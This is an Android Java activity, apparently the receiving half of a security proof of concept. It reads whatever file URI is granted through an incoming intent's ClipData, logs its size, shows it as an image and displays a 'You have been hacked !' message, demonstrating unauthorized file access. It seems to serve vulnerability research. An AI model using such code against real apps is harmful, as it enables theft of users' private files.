package com.wrlus.stest;

import androidx.appcompat.app.AppCompatActivity;

import android.annotation.SuppressLint;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;
import android.util.Log;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;

import java.io.IOException;
import java.io.InputStream;

public class ExpActivity extends AppCompatActivity {
    private static final String TAG = "STest";
    private TextView tvUri;
    private TextView tvContent;
    private ImageView imageView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_exp);
        tvUri = findViewById(R.id.tvUri);
        tvContent = findViewById(R.id.tvContent);
        imageView = findViewById(R.id.imageView);

        Intent intent = getIntent();
        if (intent != null) {
            Uri uri = intent.getClipData().getItemAt(0).getUri();
            tvUri.setText(uri.toString());
            Log.d(TAG, "ClipData = " + uri.toString());
            readFile(uri);
        }
    }

    @SuppressLint("SetTextI18n")
    public void readFile(Uri uri) {
        try {
            InputStream is = getContentResolver().openInputStream(uri);
            byte[] buffer = new byte[is.available()];
            int size = is.read(buffer);
            tvContent.setText("File Size = " + size);
            Log.d(TAG, "File Size = " + size);
            imageView.setImageBitmap(BitmapFactory.decodeByteArray(buffer, 0, size));

            is.close();
            Toast.makeText(this, "You have been hacked !", Toast.LENGTH_SHORT).show();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}